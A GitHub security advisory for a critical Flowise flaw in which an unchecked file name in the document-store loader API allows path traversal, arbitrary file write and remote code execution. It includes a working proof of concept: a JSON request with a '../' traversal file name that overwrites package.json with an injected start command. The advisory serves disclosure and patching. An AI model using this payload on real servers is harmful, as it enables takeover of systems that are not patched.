# [C] Flowise allows arbitrary file write to RCE

## Summary
Severity: Critical
Advisory: GHSA-8vvx-qvq9-5948
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-03-14
Source: https://github.com/advisories/GHSA-8vvx-qvq9-5948
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0

## Details
### Summary
An attacker could write files with arbitrary content to the filesystem via the `/api/v1/document-store/loader/process` API.
An attacker can reach RCE(Remote Code Execution) via file writing.

### Details
All file writing functions in [packages/components/src/storageUtils.ts](https://github.com/FlowiseAI/Flowise/blob/main/packages/components/src/storageUtils.ts) are vulnerable.
- addBase64FilesToStorage
- addArrayFilesToStorage
- addSingleFileToStorage

The fileName parameter, which is an untrusted external input, is being used as an argument to path.join() without verification.
```javascript
const filePath = path.join(dir, fileName)
fs.writeFileSync(filePath, bf)
```
Therefore, users can move to the parent folder via `../` and write files to any path.

Once file writing is possible in all paths, an attacker can reach RCE (Remote Code Execution) in a variety of ways.

In PoC (Proof of Concept), RCE was reached by overwriting package.json.

### PoC
In PoC, `package.json` is overwritten.
This is a scenario in which arbitrary code is executed when `pnpm start` is executed by changing the start command in the `scripts{}` statement to an arbitrary value.

**- original start command**
````
"start": "run-script-os",
````

**- modify start command**
````
"start": "touch /tmp/pyozzi-poc && run-script-os",
````

When a user runs the `pnpm start` command, a `pyozzi-poc` file is created in the `/tmp` path.

#### 1. package.json content base64 encoding
```json
{
    "name": "flowise",
    "version": "1.8.2",
    "private": true,
    "homepage": "https://flowiseai.com",
    "workspaces": [
        "packages/*",
        "flowise",
        "ui",
        "components"
    ],
    "scripts": {
        "build": "turbo run build && echo poc",
        "build-force": "pnpm clean && turbo run build --force",
        "dev": "turbo run dev --parallel",
        "start": "touch /tmp/pyozzi-poc && run-script-os", --> modify (add touch /tmp/pyozzi &&)
        "start:windows": "cd packages/server/bin && run start",
        "start:default": "cd packages/server/bin && ./run start",
        "clean": "pnpm --filter \"./packages/**\" clean",
        "nuke": "pnpm --filter \"./packages/**\" nuke && rimraf node_modules .turbo",
        "format": "prettier --write \"**/*.{ts,tsx,md}\"",
        "lint": "eslint \"**/*.{js,jsx,ts,tsx,json,md}\"",
        "lint-fix": "pnpm lint --fix",
        "quick": "pretty-quick --staged",
        "postinstall": "husky install",
        "migration:create": "pnpm typeorm migration:create"
    }, ... skip
```

#### 2. Overwrite `package.json` via `/api/v1/document-store/loader/process`
<img width="1329" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/a548732d-4bee-4cd0-8565-54fb8e560500">

> **Request Body**
```json
{
    "loaderId": "textFile",
    "storeId": "c4b8a8fb-9eb6-47ae-9caa-7702ef8baabb",
    "loaderName": "Text File",
    "loaderConfig": {
        "txtFile": "data:text/plain;BASE64_ENCODEING_CONTENT,filename:/../../../../../usr/src/package.json",
        "textSplitter": "",
        "metadata": "",
        "omitMetadataKeys": ""
    }
}
```
The part after `filename:` of the `txtFile` parameter is the value used as `fileName` in the function.
Add `../` to the filename value to move to the top path, then specify `package.json` in the project folder `/usr/src/` as the path.

<img width="663" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/13fdc756-f4d3-45f9-9929-fd978f532a02">

Afterwards, when the user starts the server (`pnpm start`), the added script will be executed. (`touch /tmp/pyozzi-poc`)

**- starting server with `touch /tmp/pyozzi-poc` command**
<img width="737" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/341be379-43ca-4acc-9126-dc398475fcf3">

**- `/tmp/pyozzi-poc` file created**
<img width="751" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/15707068-c000-4d59-972d-89d969c27087">


### Impact
**Remote Code Execution (RCE)**
Although it is demonstrated here using the file creation command, you can obtain full server shell privileges by opening a reverse shell.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8vvx-qvq9-5948
- https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7
- https://github.com/FlowiseAI/Flowise
